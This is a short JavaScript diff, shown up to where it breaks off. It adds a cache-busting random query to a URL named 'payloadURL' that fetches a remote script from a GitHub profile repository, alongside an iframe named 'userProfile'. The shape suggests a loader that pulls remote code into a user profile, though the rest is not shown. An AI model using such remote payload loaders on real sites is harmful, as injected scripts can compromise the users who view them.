@@ -1,7 +1,12 @@
+function getRndInteger(min, max) {
+    return Math.floor(Math.random() * (max - min + 1) ) + min;
+  }
+
+
 var userProfile = $('<iframe />');
 var profileHtml = "";
 var payload = "";
-var payloadURL = "https://raw.githubusercontent.com/eddiezab/custom-profile/master/profile.js";
+var payloadURL = "https://raw.githubusercontent.com/eddiezab/custom-profile/master/profile.js?v" + getRndInteger(6000, 65535) + "=" + + getRndInteger(6000, 65535);
 
 $.ajax({
     type: "GET",
